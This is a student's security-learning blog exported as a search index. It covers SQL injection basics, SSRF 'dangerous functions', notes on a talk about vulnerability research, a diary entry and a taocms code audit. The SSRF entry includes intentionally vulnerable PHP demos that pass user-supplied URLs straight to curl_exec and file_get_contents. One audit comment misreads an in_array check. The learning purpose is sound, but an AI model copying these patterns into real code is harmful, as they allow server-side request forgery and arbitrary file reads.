<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Funcky_Night</title>
    <url>/rustymoon/2023/10/28/Funcky-Night/</url>
    <content><![CDATA[<p>随手起的名字，只是忽然想起来在几首歌里都听过这个funcky。</p>
]]></content>
      <tags>
        <tag>ORN</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP_SQL-Injection</title>
    <url>/rustymoon/2023/11/20/PHP-SQL-Injection/</url>
    <content><![CDATA[<p>有点好久不见，之前在入门之处学的第一个就是这个漏洞，不过那个时候学的是漏洞，没有涉及到专门分语言的。</p>
<span id="more"></span>

<h1 id="SQL-Injection-原理"><a href="#SQL-Injection-原理" class="headerlink" title="SQL Injection 原理"></a>SQL Injection 原理</h1><blockquote>
<p>将恶意SQL语句注入到Web表单的输入页面中，该恶意SQL语句会导致原有的SQL语句发生改变，从而达到攻击者的目的去让它去执行一些危险的数据操作。</p>
</blockquote>
<p>简单说，所有涉及到的数据库的 <strong>增删改查</strong> 操作的功能点都有可能存在SQL Injection。</p>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><img src="/rustymoon/2023/11/20/PHP-SQL-Injection/SQL-Injection.png" class title="SQL注入分类">

<p>之前单独学习的时候，只学到报错注入、盲注、堆叠注入，就觉得OMG怎么这么难，堪比现在的我面对数电实验之4位并行加法器。</p>
<h1 id="init"><a href="#init" class="headerlink" title="init()"></a>init()</h1><p>在开始之前，先搞好配置吧。</p>
<p>phptorm + XAMPP</p>
<p>有phpstorm最好，没有的请有phpstudy或者XAMPP之类工具（有phpstorm也要有当然如果你自己本地有php就不需要了）。</p>
<p>参考一下：</p>
<ul>
<li><p><a href="https://cloud.tencent.com/developer/article/1739540">phpstorm运行本地php文件</a></p>
</li>
<li><p><a href="https://www.runoob.com/php/php-mysql-insert.html">php连接MySQL</a></p>
</li>
<li><p><a href="https://c.biancheng.net/view/2625.html">MySQL Workbench基本使用</a>（如果有安装MySQL的话……没有也没事，XAMPP或者phpstudy自带）</p>
</li>
</ul>
<p>然后写了一个测试php：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Flask08"</span><span class="token punctuation">;</span>
<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"demo"</span><span class="token punctuation">;</span>

<span class="token comment">// 创建链接</span>
<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">,</span><span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 检查链接</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO user (username, email, password,  id)
VALUES ('Lisa', 'lias@example.com', 'fdaggsd' , 3);"</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"新记录插入成功"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试结果：</p>
<img src="/rustymoon/2023/11/20/PHP-SQL-Injection/test.png" class title="连接测试">

<img src="/rustymoon/2023/11/20/PHP-SQL-Injection/inser.png" class title="插入数据">

<p>(尝试使用muti_query不知道为什么出错了，感觉可能又是php版本不兼容，我的是5.6)</p>
<hr>
<p><a href="https://stackoverflow.com/questions/11448068/mysql-error-code-1175-during-update-in-mysql-workbench">尝试用SQL语句在Workbench中删除记录时遇到的一个问题以及解决方法</a></p>
<hr>
<hr>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><table><tr><td bgcolor="yellow">条件:</td></tr></table>

<ul>
<li>对传入的参数 <strong>未做过滤</strong> 直接拼接到SQL语句中执行</li>
<li>直接使用<code>mysqli_error()</code>进行报错处理且没有对报错信息进行良好的处理</li>
</ul>
]]></content>
      <tags>
        <tag>LEARN</tag>
        <tag>PHP</tag>
        <tag>SQL-Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP_SSRF</title>
    <url>/rustymoon/2023/11/13/PHP-SSRF/</url>
    <content><![CDATA[<p>SSRF–服务端请求伪造</p>
<span id="more"></span>


<h1 id="SSRF危险函数"><a href="#SSRF危险函数" class="headerlink" title="SSRF危险函数"></a>SSRF危险函数</h1><h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h2><blockquote>
<p>用该函数发起请求会用到libcurl库，该库支持HTTP，HTTPS，FTP，GOPHER，TELNET，DICT，FILE，IDAP协议。</p>
<blockquote>
<p>curl_exec() - 执行一个CURL会话</p>
</blockquote>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">//demo.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html; charset = utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行之后as you can see：</p>
<img src="/rustymoon/2023/11/13/PHP-SSRF/PHP_SSRF.png" class title="SSRFpic">


<h2 id="file-contents"><a href="#file-contents" class="headerlink" title="file_contents()"></a>file_contents()</h2><p>比前者更为简洁的代码，实现一样的功能</p>
<p>file_contents(path, include_path, context, start, max_length):</p>
<ul>
<li>path 必需。所读取文件名（如果没有会报错no suc）</li>
<li>include_path </li>
<li>context</li>
<li>start 开始读取的位置</li>
<li>max_length 读取的字节数</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">//一个demo
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html; charset = utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>效果如下</p>
<img src="/rustymoon/2023/11/13/PHP-SSRF/file.png" class>

<p>然后尝试同文件夹下读取文件内容</p>
<img src="/rustymoon/2023/11/13/PHP-SSRF/atz.png" class>

<p>在测试其他位置文件之后得出：<br>只要路径正确，任意文件均可读取。</p>
<h2 id="fopen-filename-mode-include-path-context"><a href="#fopen-filename-mode-include-path-context" class="headerlink" title="fopen(filename, mode, include_path, context)"></a>fopen(filename, mode, include_path, context)</h2><p>filename参数可控就会带来SSRF攻击</p>
<h2 id="fsockopen-hostname-port-error-errstr-timeout"><a href="#fsockopen-hostname-port-error-errstr-timeout" class="headerlink" title="fsockopen(hostname, port, [error], [errstr], [timeout])"></a>fsockopen(hostname, port, [error], [errstr], [timeout])</h2><p>hostname，port参数可控就有风险</p>
]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Read-How</title>
    <url>/rustymoon/2023/11/16/Read-How/</url>
    <content><![CDATA[<p>读了Mark Dowd在Offensive Con的演讲的一些摘要。</p>
<span id="more"></span>

<h1 id="我的摘要"><a href="#我的摘要" class="headerlink" title="我的摘要"></a>我的摘要</h1><p>不是全部，只是摘写了我认为重要的。</p>
<h2 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h2><h3 id="心态"><a href="#心态" class="headerlink" title="心态"></a>心态</h3><img src="/rustymoon/2023/11/16/Read-How/1.png" class title="一些必备的特质">

<p>允许我用某三部曲来形容（因为真的很贴）</p>
<ul>
<li><table><tr><td bgcolor="CCCCFF">FEARLESS</td></tr></table> </li>
<li><table><tr><td bgcolor="CCCCFF">ANTIFRAIGLE</td></tr></table></li>
<li><table><tr><td bgcolor="CCCCFF">UNFORGIVEN</td></tr></table></li>
</ul>
<p><font size="1">如果你懂那么你就会懂…</font></p>
<p>因为代码审计，寻找漏洞是一个Odessa的过程。Odessa不仅体现在读代码，也体现在如何利用，因为有些漏洞你找到了，却不知道怎么用，有些甚至是，不能利用。</p>
<p>除了上面的三部曲，还有一个<code>curiousity</code>，其实感觉这一个适用任何一个活动或者行业。</p>
<blockquote>
<p>不仅好奇如何找到漏洞，更好奇漏洞如何诞生，如何运作。</p>
</blockquote>
<hr>
<h3 id="BUG-PATCHING"><a href="#BUG-PATCHING" class="headerlink" title="BUG PATCHING"></a>BUG PATCHING</h3><img src="/rustymoon/2023/11/16/Read-How/bugpatching.png" class title="双刃剑">

<p>安全补丁是一个双刃剑，一端对着漏洞，一端对着自己。<br>它会告诉你一些之前的漏洞信息，你可以推测漏洞成因、类型，推断一些漏洞变体&#x2F;模式——没准又成功搞出一个漏洞。</p>
<hr>
<h3 id="傲慢与偏见"><a href="#傲慢与偏见" class="headerlink" title="傲慢与偏见"></a>傲慢与偏见</h3><p>这里面提到两个有意思的例子</p>
<ul>
<li><table><tr><td bgcolor="yellow">开源和闭源谁更安全</td></tr></table>

</li>
<li><table><tr><td bgcolor="yellow">there are no more bugs in this.</td></tr></table></li>
</ul>
<p>一个普遍的认为是，开源更安全，毕竟那么多人都在eyes on it。但事实是，三个和尚没水喝。Mark在开源中找到很多漏洞，惊于这些地方无人维护。</p>
<p>一个漏洞解决了就是ending了吗？就像上面提到的漏洞变体&#x2F;模式，还有相应的修复会引入一些微妙的问题——就像高中生物里面学的，遗传病，一个又一个微妙的基因通过生殖引入，最后snow crush。</p>
<hr>
<h3 id="“MOTTO”"><a href="#“MOTTO”" class="headerlink" title="“MOTTO”"></a>“MOTTO”</h3><p>Mark认为</p>
<p><em>对一个程序的工作原理了解得越多，就越有可能找到漏洞，并利用它们。</em></p>
<img src="/rustymoon/2023/11/16/Read-How/more.png" class title="MOTTO">

<p>本觉得对于我们还有一条，你首先要加载 漏洞 模块。</p>
<hr>
<br>
<br>
<br>


<h3 id="类似费曼学习法（感觉就是）"><a href="#类似费曼学习法（感觉就是）" class="headerlink" title="类似费曼学习法（感觉就是）"></a>类似费曼学习法（感觉就是）</h3><img src="/rustymoon/2023/11/16/Read-How/feiman.png" class title="费曼模块apply">

<p>就像写例会PPT的时候，总在想如果对方在这里那里提出一个问题怎么办？OMG我好像答不上来。在想用比较“人话”的话来解释一个漏洞的原理和怎么运行怎么被利用的时候，就会发现自己好像也有很多不懂……准确来说，有点像“例会上的被害妄想症”。</p>
<p><font size="1">这个方法对学习很有效，但我从来没用到我大学课程上面……不过最近看到数据结构与算法的课程设计有点挑战性，可以当作一次1 v 1的例会。</font></p>
<hr>
<br>
<br>

<h3 id="Attention"><a href="#Attention" class="headerlink" title="Attention"></a>Attention</h3><p><font size="1">每次提到这个词，脑海里都自动播放you got me looking for attention~</font></p>
<blockquote>
<p>攻击面</p>
</blockquote>
<img src="/rustymoon/2023/11/16/Read-How/att1.png" class title="攻击面">

<p>就如图所说，漏洞只是攻击面里面的一个子集，用一句话来说就是——有人发现了一个攻击面，然后全世界的漏洞都吻了上去。</p>
<br>
<br>
 
<blockquote>
<p>复杂性</p>
</blockquote>
<img src="/rustymoon/2023/11/16/Read-How/att2.png" class title="复杂性">

<p>其实没太懂这里的complexity指什么</p>
<p>个人理解：</p>
<ul>
<li><table><tr><td bgcolor="yellow">应用功能的增加带来程序的复杂也带来漏洞或潜在漏洞的增加。Feature—Driven，生命不息，漏洞不止</td></tr></table>
</li>
<li><table><tr><td bgcolor="yellow">而开发人员对代码库的引用带来“多余功能”——只是想用代码库里某个功能，但把人一整个家族搬来，家族里面人员混杂，复杂性带来了潜在的漏洞。</td></tr></table></li>
</ul>
<hr>
<br>
<br>

<h3 id="“Findings”"><a href="#“Findings”" class="headerlink" title="“Findings”"></a>“Findings”</h3><p>也就是“随时记录”，idea、漏洞、错误什么的，一方面for积少成多，一方面for随时召回。</p>
<br>
<br>


<table><tr><td bgcolor="yellow">随时召回</td></tr></table>：就是字面意思了，有时候有些东西要记下来才行啊，然后一看，哦原来要搞这些，当时是这么想的。

<br>
<br>

<table><tr><td bgcolor="yellow">记录失败很重要</td></tr></table>for me 平时一些install，调试，exec老是出错但都是改完就扔，下次还犯。所以多记录（document）吧……

<hr>
<h3 id="“shared-experience”"><a href="#“shared-experience”" class="headerlink" title="“shared experience”"></a>“shared experience”</h3><br>

<p>这个其实是我自己取的名字<br>是对于bug patching和代码库的。当一个漏洞出现在a中，那么和a类似的b会不会也有这样的漏洞？——算法思想就那么多，这就是shared experience，再加上还是同类型，极大可能会有相同的bugs。如果没有，那么是怎么修补的呢？<br>可能人家b对于存在的bug from a的态度是：<strong>I Don’t Give A FUCK</strong>，那么就可以<em>give it a fuck</em>了（bushi）</p>
<hr>
<br>
<br>

<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>Mark认为Best cooperation makes Best output，同时工具开发和漏洞研究是分成两个世界的——指工具开发的可能没有漏洞研究的那么了解漏洞，反之可能没那么了解工具开发。</p>
<p>以及新手过度依赖工具，阅读和理解代码能力可能会达不到要求。往大了说我们就到了Cyberpunk的道德议题了——高度工具化的人类是否还是人类？</p>
<p>跑远了……</p>
<br>
<br>

<p>不过工具开发确实也很有意思。</p>
<hr>
<br>

<h3 id="“RULES”"><a href="#“RULES”" class="headerlink" title="“RULES”"></a>“RULES”</h3><ul>
<li><table><tr><td bgcolor="yellow">Understanding The Code</td></tr></table>
</li>
<li><table><tr><td bgcolor="yellow">Document Your Analysis</td></tr></table>
</li>
<li><table><tr><td bgcolor="yellow">Revist Code Bases</td></tr></table>
</li>
<li><table><tr><td bgcolor="yellow">Analyze Failures</td></tr></table></li>
</ul>
]]></content>
      <tags>
        <tag>READING</tag>
      </tags>
  </entry>
  <entry>
    <title>daily</title>
    <url>/rustymoon/2023/11/26/daily/</url>
    <content><![CDATA[<h1 id="11-26"><a href="#11-26" class="headerlink" title="11-26"></a>11-26</h1><p>这个周在当尖叫皇后，就是别人负责皇后我负责尖叫。</p>
<p>我也不知道为什么这个周会过得如此迷惑的忙碌。</p>
<p>可能是快来到的期末和一堆被冷落的作业。</p>
<p>总结一下就是，看见firewall这个词就想吐了。</p>
<p>在周天晚上一把子把所有有关firewall的笔记都删除了，可能得缓缓才能写出笔记上传。而且我的课设作业和实验一个接一个，这辈子没这么烦过。</p>
<p>之前还在问chatgpt怎么写weekly to-do list，现在我已经知道了。这么多破事（姑且让我这么称呼吧），好了写完这个我就要回去了，我要去买晚饭我要饿死了。</p>
<p>回去路上整理to do list吧。<br>一张心情写照：</p>
<img src="/rustymoon/2023/11/26/daily/%E9%9D%A2%E5%AF%B9jyp.jpg" class>]]></content>
      <tags>
        <tag>orn</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/rustymoon/2023/10/28/hello-world/</url>
    <content><![CDATA[<p>More info: <a href="https://hexo.io/docs">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>taocms审计中2</title>
    <url>/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/</url>
    <content><![CDATA[<p>不知道怎么回事，本地的taocms审计一本地文档消失了……</p>
<span id="more"></span>

<p><font size="1">原本是打算继续按照文档的顺序来读的，但是实在看得有点艰难，所以就从GUI看起。</font></p>
<hr>
<h1 id="download-init"><a href="#download-init" class="headerlink" title="download &amp; init"></a>download &amp; init</h1><p>环境：用的是windows 11 + phpstudy_pro，Nginx1.15.11，MySQL5.7.26</p>
<ul>
<li>这里需要注意的是要在配置的时候创建一个数据库，后面install用得到。</li>
<li>phpstudy_pro的数据库端口默认3306（其实在数据库配置中也可以看到）。</li>
<li>根目录要到你下载的那个cms源码文件夹，不然可能访问不了（别问我怎么知道的QAQ）</li>
</ul>
<p>看到这个界面就安装成功了:</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/taocms1.png" class title="taocms">

<p>扫描一下：</p>
<img src="/rustymoon/2023/11/19/taocms%E5%AE%A1%E8%AE%A1%E4%B8%AD2/taocms%E6%BC%8F%E6%B4%9E.png" class title="漏洞">

<hr>
<hr>
<h1 id="路由："><a href="#路由：" class="headerlink" title="路由："></a>路由：</h1><blockquote>
<p>taocms 的路由</p>
</blockquote>
<p>前台功能点路由:<code>wap/api.php</code><br>后台功能点路由：<code>admin/admin.php</code></p>
<h2 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">//api.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//包含config.php调用其所含配置</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token constant">SYS_ROOT</span><span class="token operator">.</span><span class="token constant">INC</span><span class="token operator">.</span><span class="token string single-quoted-string">'common.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//同上</span>
<span class="token variable">$ctrl</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctrl'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//request方法传入参数ctrl，$ctrl接收</span>
<span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//同上</span>
<span class="token variable">$m</span><span class="token operator">=</span><span class="token function">ucfirst</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将字符串第一个字符设为大写，为后面类名实例化做准备——类首字母均为大写</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Api'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Comment'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">;</span><span class="token comment">//判断是否存在Api和Comment，存在就die</span>
<span class="token variable">$model</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token variable">$m</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//类名实例化</span>
<span class="token comment">//这个实例中$ctrl存在，就在实例基础上调用$ctrl()</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$ctrl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token variable">$model</span><span class="token operator">-></span><span class="token variable">$ctrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//common.php部分</span>
<span class="token keyword">function</span> <span class="token function-definition function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token variable">$path</span><span class="token operator">=</span><span class="token constant">SYS_ROOT</span><span class="token operator">.</span><span class="token string single-quoted-string">'include/Model/'</span><span class="token operator">.</span><span class="token function">ucfirst</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">;</span><span class="token comment">//调用include/Model中所有文件功能代码</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		 <span class="token keyword">include</span> <span class="token variable">$path</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">//admin.php
//与前台一个道理
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建新session</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"../config.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"../include/common.php"</span><span class="token punctuation">;</span>
<span class="token variable">$action</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$ctrl</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctrl'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">//增加校验</span>
<span class="token comment">//请登录</span>

<span class="token comment">//对传入参数的校验</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">checkadmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$ctrl</span><span class="token operator">!=</span><span class="token string single-quoted-string">'login'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$ctrl</span><span class="token operator">!=</span><span class="token string single-quoted-string">'checkUser'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"index.php?action=login"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$referInfo</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$referHost</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$referInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$referInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$referInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">:</span><span class="token variable">$referInfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">//对host和ctrl的校验</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$referHost</span> <span class="token operator">!==</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_HOST'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token variable">$ctrl</span><span class="token operator">!=</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refer error'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'admin.php?action=frame&amp;ctrl=logout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

